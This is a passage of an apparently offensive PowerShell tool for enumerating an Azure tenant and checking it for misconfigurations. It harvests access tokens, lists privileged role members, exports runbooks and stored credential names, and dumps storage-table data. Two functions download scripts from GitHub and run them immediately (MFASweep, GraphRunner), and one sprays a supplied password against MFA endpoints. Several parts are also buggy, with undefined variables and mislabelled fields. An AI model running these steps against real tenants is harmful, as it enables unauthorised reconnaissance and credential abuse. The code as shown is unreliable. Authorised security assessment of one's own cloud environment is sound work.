        Write-Host "Full VM data has been saved to Excel file: $filePath" -ForegroundColor Green
    } catch {
        Write-Host "Failed to enumerate virtual machines or save results. Ensure you are authenticated and have permissions." -ForegroundColor Red
  
    
    }
    Show-AuthenticatedEnumerationMenu
}

# Enumerate Administrative Units
function Enumerate-Administrativeunits {
Write-Host "Retrieving Administrative Units..." -ForegroundColor Cyan

    # Get all administrative units
    $units = Get-MgDirectoryAdministrativeUnit

    if ($units.Count -eq 0) {
        Write-Host "No Administrative Units found in your Azure AD." -ForegroundColor Yellow
        return  Show-AuthenticatedEnumerationMenu
    }

    # Prepare an array to hold the results
    $results = @()

    # Iterate through each administrative unit
    foreach ($unit in $units) {
        $unitId = $unit.Id  # Extract the ID for the current unit
        Write-Host "`nProcessing Administrative Unit: $($unit.DisplayName), ID: $unitId" -ForegroundColor Green

        try {
            # Get scoped role members for the current administrative unit
            $roleMembers = Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId $unitId

            if ($roleMembers.Count -gt 0) {
                foreach ($roleMember in $roleMembers) {
                    $roleInfo = $roleMember.roleMemberInfo
                    $roleId = $roleMember.roleId

                    # Get the role details using the roleId
                    $directoryRole = Get-MgDirectoryRole | Where-Object { $_.Id -eq $roleId }
                    
                    # Display member details on the screen
                    Write-Host "Role Member: $($roleInfo.DisplayName), Role ID: $roleId, Role Name: $($directoryRole.DisplayName)" -ForegroundColor Cyan

                    # Add the result to the array
                    $results += [PSCustomObject]@{
                        AdministrativeUnit = $unit.DisplayName
                        RoleMemberName     = $roleInfo.DisplayName
                        RoleMemberId       = $roleInfo.Id
                        RoleName           = $directoryRole.DisplayName
                        RoleDescription    = $directoryRole.Description
                    }
                }
            } else {
                Write-Host "No role members found for this administrative unit." -ForegroundColor Yellow
            }
        } catch {
            Write-Host "Error retrieving role members for Administrative Unit ID: $unitId" -ForegroundColor Red
            Write-Host "Error details: $_" -ForegroundColor Red
        }
    }

    # Export results to Excel
    if ($results.Count -gt 0) {
        $filePath = Join-Path -Path (Get-Location) -ChildPath "Azure_AdministrativeUnitRoles.xlsx"
        $results | Export-Excel -Path $filePath -WorksheetName "RoleAssignments" -AutoSize
        Write-Host "Role assignments have been saved to Excel file: $filePath" -ForegroundColor Green
    } else {
        Write-Host "No role assignments found to export." -ForegroundColor Yellow
    }
    

    Show-AuthenticatedEnumerationMenu
}

# Enumerate Administrative Units
function Enumerate-AuthAllinOne {
Write-Host "Retrieving the basic information..." -ForegroundColor Cyan

    try {
        
        # Fetch organization details
        Write-Host "[*] Querying organization details..."
        $organization = Get-MgOrganization | Select-Object DisplayName, City, Street, CountryLetterCode, TechnicalNotificationMails, TenantType

        $mgtpolicy = Get-MgPolicyAuthorizationPolicy
        $mgtpolicyextend=(Get-MgPolicyAuthorizationPolicy).DefaultUserRolePermissions

        $response = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/organization"

	# Access specific fields
	$sync= $response.value[0].OnPremisesSyncEnabled
	$synctime= $response.value[0].onPremisesLastPasswordSyncDateTime
	
# Display fields in a table
$fields | Format-Table


        # Display organization details
        Write-Host "================================================================================" -ForegroundColor Yellow
        Write-Host "Main Contact Info" -ForegroundColor Cyan
        Write-Host "================================================================================"
        Write-Host "Display Name: $($organization.DisplayName)"
        Write-Host "Display Name: $($organization.City)"
        Write-Host "Country: $($organization.Street)"
        Write-Host "Country: $($organization.CountryLetterCode)"
        Write-Host "Technical Notification Email: $($organization.TechnicalNotificationMails -join ', ')"
        Write-Host "Country: $($organization.TenantType)"
        Write-Host "================================================================================" -ForegroundColor Yellow
        Write-Host "User and Policy Settings" -ForegroundColor Cyan
        Write-Host "================================================================================"
        Write-Host "Self-Service Password Reset Enabled: $($mgtpolicy.AllowedToUseSspr)"
        Write-Host "Guest users allowed invites from:: $($mgtpolicy.AllowInvitesFrom)" 
        Write-Host "Access to the MSOnline PowerShell module:$($mgtpolicy.BlockMsolPowerShell)"
        Write-Host "Users Can Read Other Users: $($mgtpolicyextend.AllowedToReadOtherUsers) "
        Write-Host "Users Can Create Apps: $($mgtpolicyextend.AllowedToCreateApps)"
        Write-Host "Users Can Create Security Groups: $($mgtpolicyextend.AllowedToCreateSecurityGroups)"
        Write-Host "Users Can Create Tenants: $($mgtpolicyextend.AllowedToCreateTenants)"
        Write-Host "Users allowed to read other users: $($mgtpolicyextend.AllowedToReadOtherUsers)"
        Write-Host "Guest users allowed invites from: $($mgtpolicyextend.AllowInvitesFrom)"
        Write-Host "Password Sync enabled: $($sync)"
        Write-Host "Last time password sync with on premises: $($syncenabled)"
        Write-Host "================================================================================" -ForegroundColor Yellow
        
    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    }
    Show-AuthenticatedEnumerationMenu
}

    


#Misconfigurations Submenu
function Authenticate-CommonMisconfigurations {
    Write-Host "`n==============================" -ForegroundColor Cyan
    Write-Host " Check Common Misconfigurations " -ForegroundColor Green
    Write-Host "==============================" -ForegroundColor Cyan
    Write-Host "1. Authenticate with a User" -ForegroundColor Yellow
    Write-Host "2. Authenticate with device token" -ForegroundColor Yellow
    Write-Host "3. Back to Main Menu" -ForegroundColor Yellow
    Write-Host "==============================" -ForegroundColor Cyan
    $choice = Read-Host "Select an option"
    Switch ($choice) {
        1 { Authenticate-UserCommonMisconfigure }
        2 { Authenticate-Device }
        3 { Show-MainMenu }
        default { Write-Host "Invalid option. Please try again." -ForegroundColor Red; Authenticate-CommonMisconfigurations}
    }
}

# Define global variables to hold tokens
$global:local_graph_token = $null
$global:local_mgt_token = $null
$global:local_vault_token = $null


function Authenticate-UserCommonMisconfigure{

	 Write-Host "`nLogin with User Credentials" -ForegroundColor Cyan

    # Ask for username and password
    $username = Read-Host "Enter your username (e.g., username@example.com)"
    $password = Read-Host "Enter your password" -AsSecureString
    
while ($true) {
    try {
              
        # Convert password and create PSCredential object
        $passwd = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($password))
        $creds = New-Object System.Management.Automation.PSCredential($username, $password)

        # Connect to Azure-this will not work if user does not have susbcription atached to the account
        Write-Host "Authenticating with Azure..." -ForegroundColor Green
        $null=Connect-AzAccount -Credential $creds -ErrorAction Stop -WarningAction SilentlyContinue
        Write-Host "Authentication successful!" -ForegroundColor Green
	Write-Host "Once again for Az CLI.." -ForegroundColor Green
	$plainTextPassword = $password | ConvertFrom-SecureString -AsPlainText 
	$null=az login -u $username -p $plainTextPassword 
        # Retrieve Access Tokens
        Write-Host "Completed..."

        # Management Token
        $mgt_token_response = (Get-AzAccessToken -ResourceUrl "https://management.azure.com")
        $global:local_mgt_token = $mgt_token_response.Token
	
	$global:local_vault_token = (Get-AzAccessToken -ResourceUrl https://vault.azure.net).Token
	if (-not $global:local_vault_token) { throw "Failed to retrieve vault token." }
        # Graph Token
        $graph_token_response = (Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com")
        $global:local_graph_token = $graph_token_response.Token
        Write-Host "Connecting to Microsoft Graph..." -ForegroundColor Green
        $secureToken = ConvertTo-SecureString $global:local_graph_token -AsPlainText -Force
        $null=Connect-MgGraph -AccessToken $securetoken -ErrorAction Stop -WarningAction SilentlyContinue
        Write-Host "Graph connection successful!" -ForegroundColor Green

        if ($global:local_mgt_token-and $global:local_graph_token) {
            Write-Host "Tokens retrieved and stored for this session:"
        } else {
            Write-Host "Failed to retrieve access tokens. Please verify your credentials." -ForegroundColor Red
            Exit
        }
        # Break out of the loop on successful authentication
            return Show-CommonMisconfigurationsMenu
    } catch {
        Write-Host "Authentication failed. Error: $_" -ForegroundColor Red
            $choice = Read-Host "Do you want to try again? (y/n)"
            if ($choice -eq "y") {Authenticate-User }
            else {Show-MainMenu}
    
    }
    
    }
    
}

function Authenticate-Device {
    Write-Host "`nLogin Using Device Code Authentication" -ForegroundColor Cyan

    try {
        # Authenticate using Device Code
        Write-Host "Please follow the instructions for device code authentication..." -ForegroundColor Yellow
        $null=Connect-AzAccount -UseDeviceAuthentication -ErrorAction Stop -WarningAction SilentlyContinue
        Write-Host "Authentication successful!" -ForegroundColor Green

        # Retrieve Management Token
        Write-Host "Retrieving Management Access Token..." -ForegroundColor Cyan
        $mgt_token_response = Get-AzAccessToken -ResourceUrl "https://management.azure.com"
        $global:local_mgt_token = $mgt_token_response.Token

        # Retrieve Graph Token
        $graph_token_response = (Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com")
        $global:local_graph_token = $graph_token_response.Token
        Write-Host "Connecting to Microsoft Graph..."
        $secureToken = ConvertTo-SecureString $global:local_graph_token -AsPlainText -Force
        $null=Connect-MgGraph -AccessToken $securetoken -ErrorAction Stop
        Write-Host "Graph connection successful!" -ForegroundColor Green

        if ($global:local_mgt_token -and $global:local_graph_token) {
            Write-Host "Tokens retrieved and stored for this session:" -ForegroundColor Green
            Write-Host "Management Access Token stored in variable: `$Global:mgt_access_token" -ForegroundColor Yellow
            Write-Host "Graph Access Token stored in variable: `$Global:graph_access_token" -ForegroundColor Yellow
            } else {
            Write-Host "Failed to retrieve access tokens after authentication." -ForegroundColor Red
        }
        # Show the authenticated enumeration menu
        Show-CommonMisconfigurationsMenu 
        
    } catch {
        Write-Host "Device code authentication failed. Error: $_" -ForegroundColor Red
        # Return to the menu even after failure
        Show-CommonMisconfigurationsMenu 
         }
}

# Menu for Common Misconfigurations
function Show-CommonMisconfigurationsMenu {
    Write-Host "`n===================================" -ForegroundColor Cyan
    Write-Host " Common Azure Misconfigurations Menu " -ForegroundColor Green
    Write-Host "===================================" -ForegroundColor Cyan
    Write-Host "1. Check on Custom Roles, Attributes and Elevated permissions." -ForegroundColor Yellow
    Write-Host "2. Check on Virtual Machines" -ForegroundColor Yellow
    Write-Host "3. Check on Databse Connection" -ForegroundColor Yellow
    Write-Host "4. Missing Multi-Factor Authentication (MFA)" -ForegroundColor Yellow 
    Write-Host "5. Check on Automation Accounts" -ForegroundColor Yellow
    Write-Host "6. Check Misconfigured Permissions" -ForegroundColor Yellow
    Write-Host "7. Check on Dynamic Group Membership" -ForegroundColor Yellow
    Write-Host "8. Check on Conditional Access Policies" -ForegroundColor Yellow
    Write-Host "9. Check Table Database in Storage Account" -ForegroundColor Yellow
    Write-Host "10. Check on Key Vault" -ForegroundColor Yellow
    Write-Host "11. Credentials in Container Apps Environment Variables" -ForegroundColor Yellow
    Write-Host "12. Back to Main Menu" -ForegroundColor Yellow
    Write-Host "===================================" -ForegroundColor Cyan
    $choice = Read-Host "Enter your choice"
    Process-CommonMisconfigurationsChoice $choice
}

# Process Choice for Misconfigurations Menu
function Process-CommonMisconfigurationsChoice {
    param ([string]$choice)
    switch ($choice) {
        "1" { Check-EntraIDCustomRoles }
        "2" { Check-VMConfigurations }
        "3" { Check-Databaseconfigurations }
        "4" { Check-MFA }
        "5" { Check-MisconfiguredAutomations}
        "6" { Check-MisconfiguredPermissions }
        "7" { Check-WeakDynamicGroupMember }
        "8" { Check-ConditionalAccessPolicies }
        "9" { Check-StorageAccountMisconfigure }
        "10" { Check-KeyVaultMisconfigure }
        "11" { Check-AppsEnvVariable}
        "12" { Show-MainMenu }
        default {
            Write-Host "Invalid choice! Returning to Misconfigurations Menu." -ForegroundColor Red
            Start-Sleep -Seconds 2
            Show-CommonMisconfigurationsMenu
        }
    }
}

# Individual Misconfiguration Check Functions

function Check-EntraIDCustomRoles {
    Write-Host "Checking for Custom Roles, Attributes, Licenses and Elevated permissions.." -ForegroundColor Cyan
    try {
         
    
    Write-Host "Check Custom roles in the current subscription" -ForegroundColor Green
    $customRoles = Get-AzRoleDefinition | Where-Object { $_.IsCustom -eq $true } | select name, actions
    $customRoles | Format-Table -AutoSize
    Write-Host "Guest users with Elevated roles..." -ForegroundColor Green
    $guestRoles = Get-AzRoleAssignment | Where-Object { $_.PrincipalType -eq "Guest" } | Format-Table DisplayName, SigninName, RoleDefinitionName, Scope 
    $guestRoles | Format-Table -Autosize
    Write-Host "Users with Elevated roles..." -ForegroundColor Green
    # Import Microsoft Graph Module (if not already imported)

# Define the roles to check
	$roles = @(
	    "Global Administrator",
	    "Privileged Role Administrator",
	    "Conditional Access Administrator",
	    "Security Administrator",
	    "Intune Administrator",
	    "User Administrator",
	    "Groups Administrator",
	    "Application Administrator",
	    "Cloud Application Administrator",
	    "Exchange Administrator",
	    "Teams Administrator",
	    "Billing Administrator",
	    "Compliance Administrator",
	    "Authentication Administrator",
	    "Device Administrator",
	    "Directory Readers"
	)
	
	# Iterate through each role
	foreach ($role in $roles) {
	    # Get the Role ID for the current role
	    $roleId = (Get-MgDirectoryRole | Where-Object { $_.DisplayName -eq $role }).Id
	
	    if ($roleId) {
	        Write-Output "Members of Role: $role"
	
	        # Get members of the role
	        $members = Get-MgDirectoryRoleMember -DirectoryRoleId $roleId
	
	        if ($members) {
	            # Display member details
	            foreach ($member in $members) {
	                # Get user details
	                $user = Get-MgUser -UserId $member.Id -ErrorAction SilentlyContinue
	                if ($user) {
	                    Write-Output "ID: $($user.Id), DisplayName: $($user.DisplayName), UserPrincipalName: $($user.UserPrincipalName)"
	                } else {
	                    Write-Output "ID: $($member.Id), Unable to retrieve user details (possibly a service principal)."
	                }
	            }
	        } else {
	            Write-Output "No members found for this role."
	        }
	        Write-Output "`n"
	    } else {
	        Write-Output "Role '$role' does not exist in this tenant.`n"
	    }
	}
	    
    # Privileged Identity Management (PIM) roles
    Write-Host "Check if role in PIM still set to eligible or not activated.." -ForegroundColor Green
     $currentUser = Get-MgUser -UserId (Get-MgContext).Account
     $currentUserId = $currentUser.Id
     $pimassign=Get-MgRoleManagementDirectoryRoleAssignmentScheduleInstance | Where-Object {$_.PrincipalId -eq $currentUserId}
     $pimassign.AssignmentType
    
    Write-Host "Check users with Custom Security Attributes" -ForegroundColor Green
    $allUsers = Get-MgUser -All
	foreach ($user in $allUsers) {
	# Retrieve the user's custom security attributes
    $userAttributes = Get-MgUser -UserId $user.Id -Property "customSecurityAttributes"
  
    if ($userAttributes.CustomSecurityAttributes -and $userAttributes.CustomSecurityAttributes.AdditionalProperties.Count -gt 0) {
        Write-Host "User: $($user.UserPrincipalName)"
        $userAttributes.CustomSecurityAttributes.AdditionalProperties | Format-List
        Write-Host "---------------------------------------------"
    	}
      }
           
    }
    
    Catch{
    Write-Host "Unable to run a check on ID roles..." -ForegroundColor Green
    }
    # Placeholder
    
Show-CommonMisconfigurationsMenu 
}

function Check-VMConfigurations {
    Write-Host "Checking Azure Virtual Machines..." -ForegroundColor Cyan

    try {
        # Get all VMs
        $VMs = Get-AzVM | Select-Object Name, ResourceGroupName, Id, ProvisioningState
        if ($VMs.Count -eq 0) {
            Write-Host "No VMs found in your Azure subscription." -ForegroundColor Yellow
        } else {
            # Display basic VM info
            Write-Host "Found the following VMs:" -ForegroundColor Green
            $VMs | Format-Table -AutoSize

            # Iterate through each VM
            foreach ($VM in $VMs) {
                Write-Host "`nProcessing VM: $($VM.Name)" -ForegroundColor Green

                # Check user data
                try {
                    $UserData = Get-AzVM -ResourceGroupName $VM.ResourceGroupName -Name $VM.Name -UserData
                    if ($UserData) {
                        Write-Host " - User data (base64 encoded) found for VM '$($VM.Name)':" -ForegroundColor Cyan
                        Write-Host "   $($UserData.userdata)" -ForegroundColor White
                        Write-Host "   Decode using: [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('<base64 data>'))" -ForegroundColor Green
                    } else {
                        Write-Host " - No user data found for VM '$($VM.Name)'." -ForegroundColor Yellow
                    }
                } catch {
                    Write-Host " - Unable to retrieve user data for VM '$($VM.Name)': $_" -ForegroundColor Red
                }

                # Check disk encryption
                try {
                    Write-Host " - Checking disk encryption status..." -ForegroundColor Green
                    $EncryptionStatus = Get-AzVmDiskEncryptionStatus -ResourceGroupName $VM.ResourceGroupName -VMName $VM.Name
                    $EncryptionStatus
                } catch {
                    Write-Host " - Unable to retrieve disk encryption status for VM '$($VM.Name)': $_" -ForegroundColor Red
                }

                # Audit installed extensions
                try {
                    Write-Host " - Auditing installed extensions..." -ForegroundColor Green
                    $Extensions = Get-AzVMExtension -ResourceGroupName $VM.ResourceGroupName -VMName $VM.Name
                    if ($Extensions.Count -gt 0) {
                        $Extensions | Select-Object Name, Publisher, Type, TypeHandlerVersion | Format-Table -AutoSize
                    } else {
                        Write-Host "   No extensions found for VM '$($VM.Name)'." -ForegroundColor Yellow
                    }
                } catch {
                    Write-Host " - Unable to retrieve extensions for VM '$($VM.Name)': $_" -ForegroundColor Red
                }

                # Pause for readability if results are long
                Start-Sleep -Seconds 2
            }
        }

        # Display VMs with public IPs
        Write-Host "`nChecking VMs with Public IP Addresses..." -ForegroundColor Green
        try {
            $PublicIPs = Get-AzPublicIpAddress | Select-Object Name, IpAddress, ResourceGroupName
            if ($PublicIPs.Count -gt 0) {
                $PublicIPs | Format-Table -AutoSize
            } else {
                Write-Host "No public IP addresses found." -ForegroundColor Yellow
            }
        } catch {
            Write-Host " - Unable to retrieve public IP addresses: $_" -ForegroundColor Red
        }

        # Check NSG rules
        Write-Host "`nChecking Network Security Groups for open ports (22, 445, 1433, 3389, 5985, 5986)..." -ForegroundColor Green
        try {
            $NSGRules = Get-AzNetworkSecurityGroup | Get-AzNetworkSecurityRuleConfig | Where-Object { 
                $_.Access -eq "Allow" -and $_.DestinationPortRange -in @("22","445","1433","3389", "5985", "5986") 
            } | Select-Object Name, SourceAddressPrefix, DestinationAddressPrefix, DestinationPortRange, Direction
            if ($NSGRules.Count -gt 0) {
                $NSGRules | Format-Table -AutoSize
            } else {
                Write-Host "No NSG rules allowing access on ports 22, 445, 1433, 3389, 5985, or 5986 found." -ForegroundColor Yellow
            }
        } catch {
            Write-Host " - Unable to retrieve NSG rules: $_" -ForegroundColor Red
        }

        Write-Host "`nCheck completed." -ForegroundColor Green

    } catch {
        Write-Host "Unable to run checks on Virtual Machines: $_" -ForegroundColor Red
    }

    # Show menu (optional placeholder)
    Show-CommonMisconfigurationsMenu
}



function Check-DatabaseConfigurations {
    try {
        Write-Host "Checking for SQL Servers..." -ForegroundColor Cyan
        Get-AzSqlServer | Select ResourceGroupName, ServerName, FullyQualifiedDomainName, SqlAdministratorLogin 

        # Retrieve all SQL Servers
        $SqlServers = Get-AzSqlServer | Select-Object ResourceGroupName, ServerName

        ## Loop through each SQL Server
        foreach ($SqlServer in $SqlServers) {
            $ResourceGroupName = $SqlServer.ResourceGroupName
            $ServerName = $SqlServer.ServerName

            # Get all databases for the server
            $Databases = Get-AzSqlDatabase -ResourceGroupName $ResourceGroupName -ServerName $ServerName
            
            Write-Host "`nDatabases for Server: $ServerName (Resource Group: $ResourceGroupName)" -ForegroundColor Yellow
            
            # Display the databases
            if ($Databases) {
                $Databases | Select-Object ResourceGroupName, ServerName, DatabaseName | Format-Table -AutoSize
            } else {
                Write-Host "No databases found for Server: $ServerName" -ForegroundColor Red
            }
        }

        # Indicate completion of the check
        Write-Host "`nCheck completed." -ForegroundColor Green
    } catch {
        Write-Host "Unable to find or connect to SQL Server." -ForegroundColor Red
    }

    # Call the common misconfigurations menu
    Show-CommonMisconfigurationsMenu
}



function Check-MFA {
    Write-Host "Checking for Missing MFA Enforcement..." -ForegroundColor Cyan
    
    try{
    
    IEX (iwr 'https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1')
      
    $username = Read-Host "Enter Username that you want to check for MFA:"
    $password = Read-Host "Enter Password for the user:" 
    Invoke-MFASweep -Username $username -Password $password -Recon -IncludeADFS
    
    Write-Host "Check completed." -ForegroundColor Green
     }
    catch {
        Write-Host "Failed to check single factor authentication." -ForegroundColor Red
    }
     # Call the common misconfigurations menu
    Show-CommonMisconfigurationsMenu
}



function Check-MisconfiguredAutomations {
    Write-Host "Checking on automation accounts..." -ForegroundColor Cyan

    try {
        # Get all Automation Accounts in the subscription
        $automationAccounts = Get-AzAutomationAccount
        if ($automationAccounts.Count -eq 0) {
            Write-Host "No Automation Accounts found in your subscription." -ForegroundColor Yellow
        } else {
            # Iterate through each Automation Account
            foreach ($autoaccount in $automationAccounts) {
                Write-Host "`nProcessing Automation Account: $($autoaccount.AutomationAccountName)" -ForegroundColor Green

                try {
                    # Get account details
                    $accountAccess = Get-AzAutomationAccount -ResourceGroupName $autoaccount.ResourceGroupName -Name $autoaccount.AutomationAccountName

                    # Check for public access
                    if ($accountAccess.PublicNetworkAccess -eq "Enabled") {
                        Write-Host "Public access is available with PublicNetworkAccess set to: $($accountAccess.PublicNetworkAccess), running next checks..." -ForegroundColor Cyan

                        # List all runbooks
                        Write-Host " - Checking runbooks..." -ForegroundColor Cyan
                        $runbooks = Get-AzAutomationRunbook -ResourceGroupName $autoaccount.ResourceGroupName -AutomationAccountName $autoaccount.AutomationAccountName
                        if ($runbooks.Count -gt 0) {
                            $runbooks | Select-Object Name, RunbookType | Format-Table -AutoSize

                            # Export each runbook
                            foreach ($runbook in $runbooks) {
                                try {
                                    Write-Host "   - Exporting runbook: $($runbook.Name)" -ForegroundColor Cyan
                                    Export-AzAutomationRunbook -ResourceGroupName $autoaccount.ResourceGroupName -AutomationAccountName $autoaccount.AutomationAccountName -Name $runbook.Name -Output . -Force
                                } catch {
                                    Write-Host "   - Error exporting runbook '$($runbook.Name)': $_" -ForegroundColor Red
                                }
                            }
                        } else {
                            Write-Host "   No runbooks found in this Automation Account." -ForegroundColor Yellow
                        }

                        # Check credentials stored in the Automation Account
                        Write-Host " - Checking stored credentials..." -ForegroundColor Cyan
                        try {
                            $credentials = Get-AzAutomationCredential -ResourceGroupName $autoaccount.ResourceGroupName -AutomationAccountName $autoaccount.AutomationAccountName
                            if ($credentials.Count -gt 0) {
                                $credentials | Select-Object Name, CreationTime, Description | Format-Table -AutoSize
                            } else {
                                Write-Host "   No credentials found in this Automation Account." -ForegroundColor Yellow
                            }
                        } catch {
                            Write-Host "   - Error retrieving credentials: $_" -ForegroundColor Red
                        }
                    } else {
                        Write-Host "Public access is not available for this account." -ForegroundColor Yellow
                    }
                } catch {
                    Write-Host "Error processing Automation Account '$($autoaccount.AutomationAccountName)': $_" -ForegroundColor Red
                }
            }
        }

        Write-Host "`nCheck completed. Expand access policies if needed. Check any managed identities assigned." -ForegroundColor Green

    } catch {
        Write-Host "Unable to retrieve Automation Accounts or perform checks: $_" -ForegroundColor Red
    }

    # Call the common misconfigurations menu (optional)
    Show-CommonMisconfigurationsMenu
}




function Check-MisconfiguredPermissions{
    try {
        Write-Host "Dumping Permissions and needs to verify for misconfgurations.." -ForegroundColor Cyan
       
       #Filters role assignments at the suscription level
 	Write-Host "Check the roles assigned to users at any subscription level...." -ForegroundColor Green
    	Get-AzRoleAssignment | Where-Object { $_.Scope -like "/subscriptions/*" } | Format-Table DisplayName, SignInName,RoleDefinitionName, Scope
    	
    	#Filters role assignments at the resource group level,
    	Write-Host "Check the roles assigned to users at any resource group level..." -ForegroundColor Green
    	Get-AzRoleAssignment | Where-Object { $_.Scope -like "/subscriptions/*/resourceGroups/*" } | Format-Table DisplayName, RoleDefinitionName, Scope

	#List Role Assignments for the Current User
         Write-Host "Check the current user permissions" -ForegroundColor Green
         Get-AzRoleAssignment -ObjectId (Get-AzADUser -UserPrincipalName (Get-AzContext).Account.Id).Id | Select-Object RoleDefinitionName, Scope
	   
	 #Check if current user owned any object
	  Write-Host "Check if users owned any objects. Also look at additional properties..:-)" -ForegroundColor Green
          $ownedobjects= Get-MgUserOwnedObject -UserId (Get-AzADUser -UserPrincipalName (Get-AzContext).Account.Id).Id | Format-List * 
          $ownedobjects     	
    	  
          
         
         
         Write-Output "  Check permissions on applications, you might find something interesting:"
	$users = Get-MgUser -All

# Iterate through each user
foreach ($user in $users) {
    # Get delegated permissions for the user
    $grants = Get-MgOAuth2PermissionGrant -Filter "PrincipalId eq '$($user.Id)'"
    
    # Check role assignments (Owner or Contributor) for the user
    $roles = Get-AzRoleAssignment | Where-Object {
        $_.PrincipalId -eq $user.Id -and 
        ($_.RoleDefinitionName -eq "Owner" -or $_.RoleDefinitionName -eq "Contributor")
    }

    # Skip users with no delegated permissions and no role assignments
    if ($grants -or $roles) {
        Write-Output "User: $($user.DisplayName) ($($user.UserPrincipalName))"

        # Display delegated permissions
        if ($grants) {
            Write-Output "  Delegated Permissions:"
            foreach ($grant in $grants) {
                $client = Get-MgServicePrincipal -ServicePrincipalId $grant.ClientId -ErrorAction SilentlyContinue
                Write-Output "    Application: $($client.DisplayName)"
                Write-Output "    Permissions (Scope): $($grant.Scope)"
            }
        }

        # Display role assignments
        if ($roles) {
            Write-Output "  Role Assignments:"
            foreach ($role in $roles) {
                $resource = Get-AzResource -ResourceId $role.Scope -ErrorAction SilentlyContinue
                Write-Output "    Role: $($role.RoleDefinitionName)"
                Write-Output "    Application: $($resource.Name)"
                Write-Output "    Scope: $($role.Scope)"
            }
        }
        Write-Output "`n"
    }
}

	
	
	
	#check user is a member of important group
	Write-Host "User is a memeber of:" -ForegroundColor Cyan
	$groups=Get-MgUserMemberOf -UserId (Get-AzADUser -UserPrincipalName (Get-AzContext).Account.Id).Id
	$Groups | ForEach-Object {
	    if ($_.AdditionalProperties["displayName"]) {
	        $_.AdditionalProperties["displayName"]
	    } else {
        Write-Output "No DisplayName for Group ID: $($_.Id)"
    }
}

 # Get all applications
 
$applications = Get-MgServicePrincipal -All
Write-Host "Checking Service Principal Permissions:" -ForegroundColor Cyan

# Iterate through applications
foreach ($app in $applications) {
    $permissions = $app.AppRoles | Where-Object { $_.Value -in $graphPermissions }

    # Only output when matching permissions are found
    if ($permissions) {
        Write-Output "Application: $($app.DisplayName)"
        foreach ($permission in $permissions) {
            Write-Output "Permission: $($permission.Value)"
        }
        Write-Output "`n"
    }




 
    } 
    
    }catch {
        Write-Host "Errorrrrrrrr." -ForegroundColor Red
    }

    # Call the common misconfigurations menu
    Show-CommonMisconfigurationsMenu
}



function Check-WeakDynamicGroupMember  {
    Write-Host "Checking for dynamic membership..." -ForegroundColor Cyan
   $dynamicGroups = Get-MgGroup -Filter "groupTypes/any(c:c eq 'DynamicMembership')"

    foreach ($group in $dynamicGroups) {
    	$groupName = $group.DisplayName
    	$membershipQuery = $group.MembershipRule
    	Write-Output "Group Name: $groupName, Membership Query: $membershipQuery"
}
    Write-Host "Check completed." -ForegroundColor Green
      # Call the common misconfigurations menu
    Show-CommonMisconfigurationsMenu
}



function Check-ConditionalAccessPolicies {
    Write-Host "Fetching Conditional Access Policies from Microsoft Graph..." -ForegroundColor Cyan

    try {
        # Using GraphRunner
        Invoke-Expression -Command "(Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1').Content | Invoke-Expression"
        Invoke-DumpCAPS
      
        } catch {
            Write-Host "No active session to log out from." -ForegroundColor Yellow
        }


    # Show common misconfigurations menu
    Show-CommonMisconfigurationsMenu
}




function Check-StorageAccountMisconfigure {
    Write-Host "Checking for storage accounts..." -ForegroundColor Cyan

    try {
        # Get storage accounts using Azure CLI
        $StorageAccounts = az storage account list --query '[].{name:name, resourceGroup:resourceGroup}' -o json | ConvertFrom-Json

        # Iterate through each storage account
        foreach ($StorageAccount in $StorageAccounts) {
            Write-Host "`nProcessing Storage Account: $($StorageAccount.name)" -ForegroundColor Green

            try {
                # List tables using Azure CLI
                $Tables = az storage table list --account-name $StorageAccount.name --auth-mode login --output json | ConvertFrom-Json

                if ($Tables.Count -gt 0) {
                    Write-Host " - Found the following tables:" -ForegroundColor Cyan
                    foreach ($Table in $Tables) {
                        Write-Host "   Table Name: $($Table.name)" -ForegroundColor White
                        
                        # Query data in each table
                        try {
                            # Get entities with az storage entity query
                            $EntitiesResponse = az storage entity query --table-name $Table.name --account-name $StorageAccount.name --auth-mode login --output json | ConvertFrom-Json

                            $EntityCount = $EntitiesResponse.items.Count
                            Write-Host "   - Number of entries in table '$($Table.name)': $EntityCount" -ForegroundColor Green

                            if ($EntityCount -gt 0) {
                                Write-Host "   - Dumping all data in table '$($Table.name)':" -ForegroundColor Cyan

                                foreach ($Entity in $EntitiesResponse.items) {
                                    # Display all properties and values dynamically
                                    $Entity.PSObject.Properties | ForEach-Object {
                                        Write-Host "     $($_.Name): $($_.Value)" -ForegroundColor White
                                    }
                                    Write-Host "--------------------------------------------" -ForegroundColor Gray
                                }
                            } else {
                                Write-Host "   - No entities found in table '$($Table.name)'." -ForegroundColor Yellow
                            }
                        } catch {
                            Write-Host "   - Error querying data from table '$($Table.name)': $_" -ForegroundColor Red
                        }
                    }
                } else {
                    Write-Host " - No tables found in this storage account." -ForegroundColor Cyan
                }
            } catch {
                # Handle errors gracefully
                if ($_ -match "authorization to perform action") {
                    Write-Host " - You do not have permission to access tables in this storage account." -ForegroundColor Red
                } else {
                    Write-Error "An unexpected error occurred while processing storage account $($StorageAccount.name): $_"
                }
            }
        }

        # Show common misconfigurations menu
        Show-CommonMisconfigurationsMenu

    } catch {
        Write-Error "An unexpected error occurred while checking storage accounts: $_"
    }
}



function Check-KeyVaultMisconfigure {

    
    
    try {
        # Connect to Azure using access tokens
        #Connect-AzAccount -AccessToken $global:local_mgt_token -AccountId anything
        #Connect-AzAccount -KeyVaultAccessToken $global:local_vault_token -AccessToken $global:local_mgt_token -AccountId anything
        Get-AzResource | Format-Table
        Write-Host "Checking for KeyVault secret if permission assigned..." -ForegroundColor Cyan
        Write-Host "First check - Managed Identity Use, KeyVault exposed to Internet, Access Policies"
        $KeyVaults = Get-AzKeyVault
        $AuditResults = @()
        
        foreach ($Vault in $KeyVaults) {
            Write-Host "Auditing Key Vault: $($Vault.VaultName)" -ForegroundColor Yellow

            $VaultName = $Vault.VaultName
            $ResourceGroup = $Vault.ResourceGroupName
            $Location = $Vault.Location

            # Networking configuration
            $NetworkRuleSet = $Vault.NetworkAcls
